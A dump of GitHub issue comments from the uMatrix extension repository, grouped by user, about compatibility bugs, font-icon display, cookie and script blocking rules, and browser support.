...\nuMatrix:\n\nuBO:\n\n. @gorhill \nThe problem exist also in Chrome (\"again\")! So it's NOT a browser bug (at least not in Fx only) ...\nI could reproduce with the following process ...\n1) Load URL http://www.20min.ch/sport/fussball/story/Sion-belohnt-seinen-Sturmlauf-15059427\n2) Make a refresh without cache (Ctrl+F5)\n3) Load URL https://www.mywot.com/en/scorecard/mywot.net in the same tab\n4) GO BACK function to go back to site in 1)\n5) LOAD URL https://www.mywot.com/en/scorecard/mywot.net in the same tab\n6) Repeat Step 4 and 5 (one time SHOULD be enough)\nAfter this, the 20min appears in the uMatrix of WOT ...\nAlso here: NOT in uBlock, only in uMatrix!\n. Okay, NOW I have understood! Sorry for my long time to check this and the trouble! Thank you!\n. ~~Can you please answer the following yet:~~\n~~Today, I found out with the Fx example (google maps -> swissvpn.net) that it's NOT a problem, if I WRITE the address in the omnibar.~~\n~~This means: if I open the new link in same tabe with a Mouse click or Enter from Bookmarks, it's a problem - if I write the new link and press Enter, (opens also in the same tab) it's not a problem.~~\n~~Can you explain this?~~\nI was wrong: also with omnibar exists this behaviour!\n. Ok, all right. BTW: I found also for uBlock this recommendation to deinstall first (had not immediately seen). So , to be ALWAYS secure, I make it so from now on for uMatrix/uBlock - not a big thing ...\nThanks!\n. Done!\n. Was not right in all cases, just the base version info is there, not the detailled, if the update goes over github. Over Mozilla AMO it should be okay ...\n. I use Firefox.\n. As CrisBRM said: long hostnames would not senseful, that's clear. So, the display of names should stay.\nAs idea ...\nVariant a)\nAs context-function: \"MouseRightButton, copy the name\" ...\nVariant b)\nAs direct-function: \"MiddleMouseButton\"\nBoth variants related always to the actual cell.\nWould this be technically feasible with the interactive concept?\n. I thought without manual selection. But as function (I'm not a programmer, maybe as \"JS function\") ala ...\n\"If user press middle mouse button in a first column cell take the actual cell-domain-name and copy it to the user-clipboard\"?\n. Ah, okay - NOW I understand the problem ...\nAs (last?) idea:\na TEMPORARY/OPTIONALLY expandable first column to display larger strings (also with a > symbol) ...\nwith the possibility to copy and paste the string?\n. How is your opinion about my last idea?\n. Ahh, ok, I see, thanks for the hint! But with MY \"english\" (is not my normal language) - maybe I'll give it a try :-)\n. I have changed the site ...\n. I have \"fixed\" this in translation (crowdin). So it's no more really necessary to fix it in program code.\n. Okay, I can understand this.\n. Any news about this?\nThis is really a serious one, because any links and things which should be blocked are not blocked per default in such a case!\n. Yes, the problem is not solved!\nIt's very easy to reproduce (here):\n1. I CLOSE the browser (Firefox) first.\n2. I open my text-editor (Notepad++) write for example https://www.google.ch and click on this link ...\nThen the problem appears.\nNote: has nothing to do with private mode ...\n. Ok, I see ...\nYou can fix this in uMatrix too? If not, you could look into NoScript, there is no such problem.\n. @gorhill \nUnfortunately, you don't answer if it's fixable or not ...\nThe situation NOW is not really good for a \"normal\" user!\nWith DEFAULT uMatrix prefs and if the browser is not running already, malware can principally start a malware page, because uMatrix status is \"ALL green\" ...\nA user has explicit to remove the related matrix-off switch to prevent this!\n. You can NOT reproduce it?? Uhh, then it's indeed difficult. What is your OS/Browser combination? My is Win 7 Ultimate x64 and Firefox (stable). However: this is interesting info for me: I will TRY to find out, what is responsible for this behaviour ...\nYour argument about the extension: okay, I understand, thanks for clarification!\nThank you for fast response!\n. This COULD be interesting: I'm relatively sure, that uBlock had the same behaviour too. But - at least with actual dev - it's NO MORE the case ...\nEDIT: Not sure about uBlock before ... however: uBlock has not or no more this behaviour ...\n. Works! Well done!\n. Note: this was NOT in private browser mode ...\n. Okay, yes, I see, thank you! Then I close here ...\n. Ok, all right, thank you!\n. Thank you all, for your interesting statements! Probably, I'll go with the combo uMatrix/uBlock from now.\n. Ohh, all right, SORRY!\n. Ok, all right, thanks!\n. So good, cool!\n. How is your status for this suggestion?\n. Ah, ok :-)\n. That's good - thank you!!\n. All right, thank you very much ... and closed.. However: it confuses the users .... @gorhill \n\nThe scrollbar issue is a browser bug, it does not occur with chromium, and it also occurs with other extensions in instances for which no scrollbars should be shown at all and yet they are.\n\nOkay, it's a browser bug, but how awesome would it be if you could support us Firefox users nevertheless with a workaround till the browser bug is away at some day hopefully? It's really annoying .... URL is: https://www.conrad.ch/de/ekastu-sekur-atemschutzmaske-mandil-412-183-filterklasseschutzstufe-ffp3v-5-st-831756.html\nHere a better screenshot, I am definitely at bottom ...\n\nFilterlists: ALL default filter lists.. Thank you. I have even a wider scrollbar too ... I know such things are difficult to handle (each system is a bit different, etc). I'll try to find out why I have this here ... could related to dpi setting, graphic card driver, screen resolution, multi monitor, fonts or or ...\nJust one question: you have tried with current chrome BETA too I assume?!. JFI: it SEEMS, here is only the expanded part of matrix \"affected\".\nIf I change this ...\n<div class=\"matSection\" data-expandos=\"233\">\n... into this ...\n<div class=\"matSection\" data-expandos=\"233\" style=\"\n    height: 56px;\n\">\nall is good HERE.\nIf no explicite value of height is set there it takes the value 52px.. @gorhill OMG, I have indeed \"no-workers: * true\" and yes, after whitelisting the site, it works (also the analysis runs now again in Fx) ...\nI hope I will never forget that case - thank you so much!!. ",
    "gautrr": "I see. I had no idea about Firefox ESR, but it makes more sense now. In that case Icecat should be on ESR 38 soon I guess, since that should be the next release or the one after that.\nApologies if this was filed in the wrong place. Is there a better place for questions like this, since it's not a bug per se?\nAnd thanks for your hard work gorhill, I couldn't live without uBlock Origin. :)\n. Well, now I feel stupid. Should have thought of that. Thanks!\n0.9.0.1 works!\n. ",
    "TheLoneWolfling": "Also a Pale Moon person, also want to run uMatrix, but cannot due to incompatibility.\nToo bad you don't have the manpower.\n. Thank you very much!\n. ",
    "ParticleMon": "@gorhill I'm sorry you don't have the manpower for this--would a donation help?! :)\nIf not you, then hopefully someone will step up to the challenge. Pale Moon is my browser of choice, and apparently others' too.\nI appreciate your high-quality work and attention to under-the-hood improvements. I'm grateful that you included legacy Firefox support in uBlock, and so I await the same for uMatrix, which I use in Chromium and Firefox. But it seems odd that adding pre-Australis support isn't as straight-forward as it was for uBlock.\n. ",
    "LimboSlam": "@gorhill, all is good. Thanks for implementing the pre-australis/Pale Moon code into uMatrix and ublock origin. Also when you get the chance, come around our forums and see how much we appreciate your hard work towards these powerful and handy tools.  \n-Pale Moon Users and Devs/Admins.  :+1:\n. @gorhill Both installed and functioned well under our own GUID, so yes as far as I can tell they do. The adding to our store I'm not sure because I wouldn't be the guy for this with my little knowledge of coding/programing, that and I don't want to yes to something that's above my authority here. Though I'm sure if you contact one our add-on devs/devs (Moonchild, Matt A Tobin) they could answer your question. You can do this through our forum (need to sign up first) as a private message or public notice and here at github.     \n. @gorhill I went ahead and contacted MC and he's ok with this, but to clarify, Matt A Tobin is the lead dev on this so you will have to talk to him directly on this, ok. \nAnyways here's our exact conversation: \n \"I'm perfectly fine with it being listed on APMO directly as a download, also hosted by us if desired. Tobin is in charge of these updates, though, and the system that's currently in place to add/update extensions and serve updates to Pale Moon users. uMatrix and uBlock are more than welcome as additions.\"  :)\n. ",
    "Radagast": "More of the same. According to fx the tabs have finished loading...\nuMatrix 0.9.1.1\nFirefox 38.0.1\nWindows 7 Ultimate x64\n\n. I'm encountering this issue with fx too. I've found if I have flash set to 'Ask to Activate' even with the necessary connections allowed in the matrix, embedded flash will not load. If the flash plug-in is set to 'Always Activate', using the same matrix settings, embedded flash will play.\nuMatrix 0.9.1.1\nFirefox 38.0.1\nWindows 7 Ultimate x64\nAs an example: https://www.pathofexile.com/forum/view-thread/1281570\nWith the matrix settings below, with flash on ask, the plug-in fails. with flash on always, the plug-in loads.\n\n. > You will have to share more details about your environment: disclose everything which is relevant for me (or anybody else) to produce your results.\nI can reproduce the 'issue' at will by watching several videos on youtube back-to-back. In firefox Nightly, open about:performance and play several videos. uMatrix appears under both Performance of Add-ons and Performance of Web pages. As soon as youtube is closed uMatrix returns to normal.\nAs far as details:\nWindows 10 Pro \nFirefox 42.0a1 (2015-08-08)\nAs far as the logger is concerned, I have it open in a pinned tab most of the time and the rules are already set for Youtube, blocked items are yt cookies and doubleclick ads. \n\nHere's a pestbin with firefox details and the relevant about:memory section.\nhttp://pastebin.com/rqxWLvyB\nlet me know if you need anything else. \n. Apologies for the delay in replying, I've switched back to Windows 7, now I need to investigate. \n. @acrobat1 - check your crash reports, your issue may be related to 1187196 - 1248489 - 1187196 - 1206393\n. Apologies. Version is 9.3.4. As mentioned in my earlier post, this happens when restarting the browser, i.e., with ( restart) or following a browser update.\n. I also don't have extensions.umatrix.forceLegacyToolbarButton in about:config. However, for me the issue seems to have corrected itself, although I have no idea why... \n. Is this Windows specific? For me, on Linux, with the exception of the 'svg' image on the MathWorks site, which has the type 'object' everything seems to be displayed/logged correctly.\n\n. ",
    "Dupond": "@CrisBRM Thanx for that, I've followed your advice.\nIs this workaround enough to close this issue, or do you guys think I should stay it opened waiting for an answer from gorhill ?\n. ",
    "wsldankers": "Strange thing is, on the 3 PC's where I use Firefox with uMatrix and use_document_fonts=0, only one has problems displaying the buttons. The other two are fine. I have no idea what the difference is, but if someone knows where to look\u2026 (I tried to diff the prefs.js files but the output was too much).\n. All three are version 41. I compared the settings as mentioned by that article but they seem to be identical. But perhaps this is just a local issue; if firefox indeed has a workaround for icon fonts, it may be that this bug can simply be closed.\n. Managed to fix it by resetting the (Ubuntu) fontconfig config to its defaults. YMMV. Yes, I referred to https://freedesktop.org/wiki/Software/fontconfig/ which is basically a linux OS component. It solved the problem for me, it may solve the problem for others. I'm sorry to hear it didn't solve it for you but I guess that's what YMMV means.. ",
    "grumpygeek": "uMatrix 0.9.3.6, Pale Moon 27.0.3 (also same in latest unstable build), Win 8.1\nbrowser.display.use_document_fonts = 0 and the font icons are OK in uMatrix with gfx enabled BUT the setting recommended in the uBlock issue, no remote fonts, will not save in uMatrix rules.  I confirmed that other changes would save.  Unless I'm missing something, this is not fully resolved for pre-41 Firefox (PM 27 is based on FF 38).  Before asking PM developer if he can add a fix in the browser, is there anything I can do for uMatrix similar to the uBlock solution?. No pref in PM with \"fontconfig\" or \"font.config\" or \"font_config\"\nI'm on Windows, so if you mean an OS setting, that's not likely to help\nAlso, I checked Waterfox 50, and same problem is there too.\nI can live without the font icons, it just looks goofy.\nEDIT: I hope you weren't just referring to gfx.downloadable.fonts.enabled, because obviously it works with that set to default (=true), but that was the undesired setting.. Yes, it worked for me.  Thanks.  The first link says ttf but is to a html page, then the link on that 2nd page is the actual file (click download button).  Once downloaded, dbl-click file, click install button in font viewer (this is for Windows).  . Be careful with allowing meta refresh.  That was used by that famous hacker guy after he got out of prison and I've tried to keep it blocked ever since.  If it is default block, allow on selected trusted sites, as I think you're planning, then I think that is generally OK (except for when a site gets hacked by dudes like him).. Don't want to hijack Gorhill's thread.  Also want to avoid mentioning the guy's name.  So here, https://tinyurl.com/pdlzg3s. Waterfox 40.0.2 at the moment.  If I knew of any specific relevant details, I would add them.  But I assumed it was probably something easy I had overlooked.\n. Here's a little more: enabling \"Other\" for the site allows saving to work.   This \"Other\" category is a bit vague to me so I'd prefer a global setting to specifically just allow saving page if that is possible.  I hope that's clear.\n. I don't know if I blocked everything, but I guarantee you I tried. :)  That's what I use these addons for.  Same with NoScript and RequestPolicy, which I can now do without if I get uMatrix setup right.  Then I reenable just what I want as I come to it.   That's why uMatrix suits me better than uBlock Origin.   I can live with this if I have to.  BUT, there is no danger and no reason to block saving a page, that's a basic function of browsing.  (Yes, I read the explanation, but that just explains why it's not working right.  It's Mozilla's fault; I never did like the way that worked.  Saving a page should use the file that is already in the cache, not download another copy; then it's just a simple local file copy process and no concern with internet protocols.)  I may see if I can an addon to give me the cache file name (that was built in to Opera years ago) and then just copy that file to the right folder - even a bigger pain but I'll be beating them at their own game.\n. \"uBlock, HTTPS Everywhere and SDC are all fine) \"\nSDC has been having and causing this instability problem for years.   Ghostery does too.  And a few others I don't recall, all restartless, and all/most place their button at the right edge, always starting on the nav toolbar, and are not stable when moved anywhere else.  It's based on an old, underlying flaw in Mozilla's code which is not likely to ever be fixed.\nuMatrix is mostly stable (for me) in the default position at the right edge of nav bar, without SDC or Ghostery installed.  But occasionally uMatrix will disappear after installing a new extension that tries to take that spot.\n. I think there is zero chance of Mozilla fixing it, unless it also affects the new web extensions.  It's been happening longer than I can recall, maybe 2.0.  Also affects SeaMonkey, but not as bad, and every other Mozilla browser I've tried (not counting K-Meleon, which used to have plenty of its own problems).  And may be one of the causes relating to the profile becoming irrevocably corrupt once you have around 4-5 dozen extensions installed.  I've been through that process too many times.  The new SDC alternative for PM, Crush Those Cookies, is also badly affected. [EDIT: CTC now fixed!]\n. Do you mean \"Options\"?  (Or, maybe you are using a different browser.)  There are other extensions that do the same thing, usually because there are some settings on the \"More\" page.  Since uMatrix calls it's configuration interface \"Dashboard\", it might also be confusing to some people if the Options button opened the Dashboard tab, but that's up to the developer.\n. OK, I understand, the addon description is also what you get by clicking \"More\" link.  The button has always been labelled Options for me on Windows, but I think there are some differences on others OSes in menu labels so maybe that is why one of us sees Options and the other sees Preferences.  Anyway we'll have to let gorhill decide if the Options/Preferences button which is part of the browser should open Dashboard (i.e., the tab with uMatrix \"preferences\") or just open the description page (\"More\") which does have a button to open Dashboard.  I'm fine either way.  Also FWIW, you may already know, you can click on the black title bar in the Matrix to get to Dashboard.\n. See if you accidentally checked \"Color Blind Friendly\" on the settings tab of Dashboard.. ",
    "berkley4": "I believe this issue is solvable, at least on nix systems, by installing fontawesome-webfont.ttf locally. I've put this file in /usr/local/share/fonts/font-awesome/ and then run fc-cache -fv. Make sure the directory has 0755 access permissions, and the file 0644.\nYou can find the above ttf file here - https://github.com/FortAwesome/Font-Awesome/tree/master/fonts. ",
    "b-rodrigues": "That second Fix works great with Vimperator also!\n. ",
    "AndrewKvalheim": "Sorry for the reference spam. I'll try to strip that out in the future.. ",
    "dorkbox": "There has to be a better way to do this -- changing users privacy settings (even for something as trivial as this) should never happen. Perhaps a dialog explaining what to do?\n. @gorhill I appreciate your honesty in this matter, as well as the work you and others have done. Your given points make sense, and I agree.\nIf I may make a suggestion, would you consider linking the commit that made this change into the wiki? I understand this would be terrible idea for every change made, but in this specific case, it would help those wanting to follow the privacy changes that were made, rather than having to dig through the commit history to find it.\n. @gorhill Perfect. Thank you.\n. ",
    "algazarra": "what? you have no respect for the issue I submitted? and you give 15mins to reply? are you loco bro?\nI'm on chromium on lubuntu, I installed and disabled umatrix (on the power button) and it still blocks content.\n. Problem persists... have no idea how to use the logger.\nI'm on lubuntu w/ chromium + uMatrix (disabled)\nGo to tradingview.com\nopen the chat (you won't see any published charts there so you won't notice they're blocked)\ntry opening any shared charts inside the chat\n. @gorhill I'm confused\nJust activated uMatrix and now charts are working again.\nI've been submitting issues to trading view devs. They've been making changes as we speak. Let me get back to you if problem persists. I believe the problem is not on uMatrix side.\nBTW, what could be the reason for the charts being blocked even when uMatrix is disabled? TY\n. > Strict HTTPS could be a reason.\nI'm using HTTPS Everywhere\n*maybe consider removing the unable to reproduce tag\n. ",
    "robertleeblairjr": "The uMatrix releases up to version 1.0.0 are still not signed so that users can install them on the latest stable channel of Firefox. Will there be plans to sign the latest uMatrix, version 1.0.0, so that it can be installed on Firefox version 52+?. I just came across the feature to add an extension via the development version section on the Firefox extension page for uMatrix, which I must have overlooked previously. I was just recently able to install uMatrix version 0.9.9b12 with Firefox version 52.0.2. No reports of any problems, thus far. Thanks for the reply and assistance.. It would be nice if Mozilla would implement an automatic reporting feature to extension/add-on developers, similar to the Firefox crash reporter, and/or performance/usage reports to aid them with improving the product. Perhaps, this is available and I'm unaware of it.. ",
    "gqqnbig": "Thanks for your timely reply. I read Rules syntax wiki page, which mentions comment syntax, then I think it is supported. If actually there is nowhere to write comment, you may revise the wiki page to avoid new users being misled.\n. ",
    "WernerCD": "Thanks for the reply.\nNot sure if this will reopen this or not, but should the two (uBlock and\nuMatrix) be run side-by-side, or would it be preferable to run one instead\nof the other?\nOn Tue, Jun 2, 2015 at 11:12 AM, Raymond Hill notifications@github.com\nwrote:\n\nClosed #249 https://github.com/gorhill/uMatrix/issues/249.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/249#event-320125085.\n. Thanks again for the reply (and again for the quick reply).\n\nI definitely don't think I'll remove uMatrix at any point soon (I've been\nusing it for ages now) so I think I'll explore using both, as it looks like\nthat's where the signals my tin-foil hat catches suggests me to do.\nI'll also explore the differences between the two approaches more than I\nhave previously as it seems like there are more differences between the two\nproducts than I realized.\nChris\nOn Tue, Jun 2, 2015 at 12:47 PM, Raymond Hill notifications@github.com\nwrote:\n\nwould it be preferable to run one instead of the other?\nThis is best answer by you. I don't know what level of blocking control\nyou are seeking. For most people uBlock does provide plenty of control, as\nit is also able to act as a default-deny firewall. uMatrix is really for\nthose who wants to be able to also block by classes of requests, not just\naccording to their origin.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/249#issuecomment-108011954.\n. \n",
    "Zantier": "Ah, I see. Thanks.\n. ",
    "woky": "@Snapy No. The response size is 0B. The request contains same kind of payload that is in URL query part in GET requests to google-analytics.\n. ",
    "ganego": "I would like to bring this up again. \nUsing uMatrix 0.9.1.2 on FF Nightly 41.01a.\nFor me the cookies work as expected by issue opener:\nIf I have uMatrix enabled and go for example on www.focus.de only a cookie for the root domain will be created (as this is allowed in the matrix). \nIf I disable uMatrix for this site there will be several 3rd partie cookies saved.\nThe option in uMatrix to delete blocked cookies is disabled.\nAnd I also have a question regarding this feature - if it would work as explained by the help text:\n1) If, for example, I go on a website that gives me a google.com 3rd party cookie, but it does not get deleted by uMatrix and I then go to google.com, will they be able to read that cookie?\n2) If I have some legitimate google.com cookies (login or so) but on another website the google.com cookie wants to be saved as a 3rd party (tracking) cookie, and uMatrix is set up to delete blocked cookies, will uMatrix also delete my legitimate login cookie?\nThank you for all your work with uMatrix and uBlock Origin :)\n. ",
    "AJ79": "Sorry if not clear enough, I meant disable on Homepage only when restart FF in private browsing.\n. The page shows \"about:blank\" after Firefox restarted. I have set Firefox settings to \"always use private browsing\"\nAnother try, after restart Firefox \nhttp://i.imgur.com/mjOfVin.png\nThen I refresh Firefox browser (not touching anything in uMatrix)\nhttp://i.imgur.com/76DkVul.png\nBtw I using Firefox add-on Personal Menu in restarting the browser, ain't sure if it related to the issue\nhttps://addons.mozilla.org/en-US/firefox/addon/personal-menu/\n. Weird... I suppose it's my end problem after restart Firefox, Matrix filtering shows \"blank.about-scheme\" I'll try figure it out. \nThanks heaps for your time Mr Gorhill\n. @Blutgang . Thanks alot for your explaining!\n@gorhill, yes it shows blank.about-scheme while on a Yahoo page.\n    My situation\n1. Firefox options > about:preferences#general : When Firefox starts - Show my home page\n    http://i.imgur.com/bEcx6nP.jpg\n2. Firefox  options > about:preferences#privacy : Firefox will never remember history\n    http://i.imgur.com/M2NJNpW.jpg\n3. Restart Firefox\n    It shows \"blank.about-scheme\" on homepage regardless what sites I've set and after refresh browser all is ok\n. ",
    "stryx": "I'm using uMatrix with quite restrictive default settings (essentially only 1st-party html, css+fonts and images are allowed) and manual exceptions, along with uBlock origin for static filter lists (and in particular strict blocking). I had been wondering for quite a while why uMatrix lumps together CSS and fonts. CSS is often necessary to view a page, whereas fonts usually are as dispensable.\nTherefore, a few days ago I changed the settings of uBlock origin to block all fonts by default (no-remote-fonts: * true). As a result, I have to keep track of manual exceptions on a per domain basis in both uBlock origin and uMatrix. To me it would make more sense to use uBlock origin for static filter lists only (plus maybe a few very elementary manual mechanisms for people who don't want to install uMatrix) and leave all the more fine-grained manual control to uMatrix.\n. There are many ways to include SVG-images in web-pages: as <img>, <object>, as a background image in CSS, data-uri, <iframe>, \u2026 It seems that depending on the way it is included, SVG images may appear in different columns in uMatrix. From a user-perspective this is not quite intuitive. But I'm not sure if this should be considered a bug. If so, it's probably not a good idea to blame the browser.\nConcerning the documentation on MDN linked above\n\n[1] Type 5 as seen on this reference documentation.\n\nit is interesting to note that it says \u201cIndicates a generic object (plugin-handled content typically falls under this category).\u201d I guess this should be read with emphasis on \u201ctypically\u201d. If this is the information uMatrix uses to determine the columns, the column name should be changed from \u201cplugin\u201d to \u201cobject\u201d.\nSince I haven't installed any plugins, it was quite disturbing for me as recently my online banking web page issued strange error messages after uMatrix had blocked content classified as \u201cplugin\u201d.. ",
    "slycelote": "Looks like HTML5 video is included into \"others\" too. Doesn't make sense IMHO, it's logically the same as images.\n. ",
    "quinncomendant": "Ok, that is logical. I can see how it is more secure to consider each base domain unique, since the content behind the domains is not under one authority. Blanket-allowing all of them would open a security gap. Thanks for the clear explanation.\n. I can invoke the popup from the logger, but the scope is set to the domain ogfcmafjalglgifnmanfmnieipoejdcf.chrome (the extension URI), not the hostname of the window I have which has its toolbar disabled. So not helpful at all. This is uMatrix 0.9.1.2 with Chrome Version 43.0.2357.130 on OS X.\n\n. Aha, found it\u2014the \"status indicator area\" is the second column of the logger (I had to basically click around randomly on the page until I discovered what that \"area\" was). For those who haven't found it yet, here's a screenshot with the location to click circled in red:\n\nYes, this works to invoke uMatrix for any tab. =)\n. > you can set a keyboard shortcut to open uMatrix if you are using Google Chrome. \nHow? I don't see that option. I'm on Chrome on OS X.\n. WOW! You just blew my mind.\n. ",
    "Bluscream": "I tried\n* cloudfront.net * allow\n* cloudfront.net script allow\n* *.cloudfront.net * allow\nbut umatrix is still blocking all cloudfront scripts:\n. So i need to find which hosts file is blocking these and disable that?. Well, there are a lot of websites using cloudfront scripts that break when they're blocked, when i try to \"whitelist\" them one by one my browser would probably crash. Why is there no simple regex support?. ",
    "LifeIsStrange": "It will be wonderful that you adds support for Fennec (Firefox on Android) \n. Oh yes I know and use, thanks =]\nI spoke of uMatrix. \n. Oh I can do tests for you on my oneplus one ! \nI use everydays 4 hours of Firefox mobile, I am often using the nightly but I May use all the Firefox versions that you want for tests. \n. ",
    "TeddStriker": "@LifeIsStrange You can get uBlock0 for Fennec, if you manually download the latest .xpi from the release page here.\n. What browser are you using? What OS? Please read this before opening new issues. There's not much people can do to help without the necessary informatin. Can you confirm that the add-on is indeed installed? Please provide more information.\n. I haven't yet been in a position to need this, but I would really like to have if the option. That is, assuming its not too much work, seeing as its not really a must-have feature.\n. ",
    "msva": "Btw, @gorhill, can you add few more words about the reasons to not allow using uMatrix in Firefox for Android? ;)\n. ",
    "Atavic": "Android has IMEI, a unique identifier provided by the manufacturer.\nIt has zero privacy on hardware/OS level: does an addon like umatrix make sense on such devices?\nMobile privacy in the enterprise?\n. No, google enforces it.. @Drugoy Javascript. Another case is restricting embedded videos.. .rss files are nothing more than improved xml files with a title, a short intro and a link to the complete article. Look into the code of brief (rss reader) if there's something objectionable.. Cache-Control: must-revalidate. It's not the same behaviour, umatrix always enforces its settings, while PB acts only on the third party sites it sees as trackers.\nWhen PB blocks cookies from being read or created, it will also block the referer header.. non-http schemes are handled in the browser options or at system level.\nhttp://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml\n. websockets-security-overview. The problem is that many pages are served with mixed content and by disallowing the non-https parts some do not work properly. Even integrating this new toggle those pages will give errors.\n. @Celti Sorry I wasn't clear. Javascript vulnerabilities are exploited by malicious websites which are offered either with http and https so the proposal of adding a new toggle will give more site usability issues, while the security won't be improved.\n. The Logger comes handy, maybe it could have a sensitivity threshold that warns when an uncommon number of behind-the-scene events happen?\n. The threshold should be modifiable by the user, as the score in Karma Blocker\n. That wasn't a tentative to improve anything.\n. @vzjrz addons like maone's no script can block/unblock JS with an icon.. Ajjj... Right. What about policy-control\nAMO. Cannot you set static rules for that specific scope? If the links are dynamic you can create broader rules, up to nine.com.au. @k-h So you had Firefox 49 and then you went back to 48. \nDid you modify the GUI on Firefox 49? Did you add/remove icons/toolbars?\nMaybe the FF 49 GUI settings aren't working well on FF 48.\n. I had similar problems caused by removed addons that left some errors into my toolbar. A new profile corrected it.\n. There are some other addons for this specific purpose, as Random Agent Spoofer or UAControl that lets you choose the User-Agent on a per-site basis.\n. There's randomua as Webextension.. maybe the browser went back to the previous site?\nPage built with http://ionicframework.com/\n. http://relay.mx/ works here.\n. You should give more info as Firefox version... \nIs this related? https://github.com/gorhill/uMatrix/issues/667. That will make ublock and umatrix very close to each other. I see many users using both, leaving ublock mostly untouched while refining blocks on umatrix for specific issues.\n. @WillemMali Not detrimental at all, but there will be an big overlapping with uBlock. . @Bebef try changing matrix-off: behind-the-scene true. Seems like google chrome with adblockers and stackoverflow have some recurring problems.\nThere are reports about it on stackoverflow itself.\nParticularly, JS errors appear regarding https://www.adzerk.net/ados.js\nand https://ssum-sec.casalemedia.com/ which is a company that tracks browsers.\n@Bebef if you don't have to login on the page, I suggest http://bfilter.sourceforge.net proxy to block most JS.. For googletagmanager:\n\nList of iframes included\nhttp://www.googletagmanager.com/ns.html?id=GTM-KS7LJN\n\nSee: https://sitecheck.sucuri.net/results/www.lidl.cz#sitecheck-details. That's working correctly. By zooming in you can trigger onclick events in web pages.\nEDIT: That's not this case, as the image is loaded directly.. Maybe it's the interaction Chromium/uMatrix the culprit here?. >Currently uMatrix cannot detect WebSocket based connections made via ws:// and wss://\nSo will you be adding support for it in the development build ?\nWebSocket schemes are handled at system level.\nWhat you can do inside a browser is prevent to load the specific scripts that activate websocket connections.\n\nThe WebSocket Protocol is an independent TCP-based protocol.  \n\nhttps://tools.ietf.org/html/rfc6455#section-1.7\n. You should look at the OSI Layers: you can't manage all WebSockets neither in an addon nor in a browser, as WebSockets do not happen at application layer only. They go beyond that.. @rjkpa Are you referring to uBO-Extra?. Maybe it's related with meta name=\"viewport\" value? Which system is affected?. @WagnerGMD The culprit is the browser, maybe there's an AV or a software Firewall (with HIDS module) causing the hang in your system?. Sorry, but I didn't see that a www.apple.com script had that issue. Now the issue is clear.. @gorhill Sure.. This is a common problem for every extension that tries to change the user-agent from inside the browser. . Optimal choice.. A general issue that was present for years.. By r-clicking on the browser GUI. Then choose Customize. The pop-up has that option on bottom.. > see https://i.imgur.com/vnTPFKh.png\nWhich firefox version?. No issue in Palemoon, @unexistance may have something messing with Firefox UI, as normally uMatrix UI doesn't follow the background mods for the rendered pages.. If you want dark background you have some options as using an addon as Stylish or Greasemonkey.. @gorhill comment related to https://github.com/gorhill/uMatrix/issues/656. >Because FP isolation will break CSP (and other cookie controlling addons, and cache and storage access)\nhttps://github.com/pyllyukko/user.js/issues/245#issuecomment-286997868. This browser bug means that Firefox follows the link on rel=\"shortcut icon\" to get the icon. Then is it added to the cache in places.sqlite.\nThis is a privacy issue and a potential security problem: unique ETag values can be added to these images.. Favicons aren't standardized. The icons are provided in different dimensions and the browser must reduce them to 16x16 or 32x32 after they are retrieved. Maybe this allows to bypass uM restrictions?\n@gorhill by report do you mean to open an issue on bugzilla? There are some issues for favicons and most are latent or ignored. \nOne issue for the android browser (where favicon is loaded with the browser ignoring the proxy settings) has been \"resolved\" with the idea that a system proxy should be set, instead of the proxy settings within the browser.. The entry adds a line into the log file when the browser is successfully logged into the sync account.. That's a difficult one, extensions run inside the browser and the drop-down window is affected \nby the focus (that's why your interactions cause it to close).. Yes, the logger stays on when out of focus.. @ravenise Great! Now you can close this.. Try using the same browser's version.. If you are looking at the addon version, compared to the webextension version, it's a Mozilla Firefox issue.. @EC-O-DE Which versions are you comparing?. >unblock it yourself\nhttps://github.com/gorhill/uMatrix/issues/341. That requirement is most of the times a workaround to bypass adblockers or grab as much data as possible from the visitor's browsers. That's why we should block scripts when not needed.. ",
    "navidada": "Maybe I don't understand the way these extensions work together, or maybe I didn't explain myself so good, so I'll try to give a specific example for what I'm saying.\nI'm referring to the fact that if I leave uBlock with default settings (everything is gray) then no mater what uMatrix is blocking, uBlock will show that it also blocks some of the things uMatrix has blocked and it will also allow some of the things that uMatrix has blocked.\nFor example, arstechnica.com. My uMatrix settings are \"only allow connections from 1st party and block all cookies\", so in order for arstechnica to work properly, I need to allow it to connect to arstechnica.net. All other connections such as google.com, adobedtm.com, parsely.com, etc. are blocked. All in all there are 108 possible connection, 96 are authorized by uMatrix, the rest, 12, are blocked.\nBut when checking uBlock, it seems that uBlock checks all of these 109 connections, also the 13 which are blocked by uMatrix. Then uBlock decides to accept requests from assets.adobedtm.com, www.google.com, www.googletagservices.com, and blocks www.google-analytics.com, static.parsely.com, speed.pointroll.com, etc which were already blocked by uMatrix.\nIf uBlock is checking things that were already blocked it's using CPU power for nothing.\nOf course one can create dynamic rules in uBlock which will be equivalent more or less to the ones created in uMatrix for this specific site. But this means that it needs to be done for every single site that is broken. One will need to unbreak sites in both uMatrix and in uBlock. Or accept that uBlock will sometimes do some extra work which will result in nothing.\nWhat am I missing here?\n. I'm seeing this in Firefox.\nThough I understand the logics behind the advantage of parallelism of per-process architecture. It's just that the diagram of \"The filtering engine\" in HTTPSB seemed very compelling and logical, though I didn't take into account the parallelism issue.\n. ",
    "sebie": "Sorry, but do you think you could clear up my confusion. Are you reporting a vulnerability in uMatrix's Agent Spoofer or in User Agent Switcher? \nIf it is uMatrix's Agent Spoofer, may you elaborate on what the problem is? Does it not work?\nIf you are encountering problems with User Agent Switcher, it would be best to report it to them, not to uMatrix (here).\n. ",
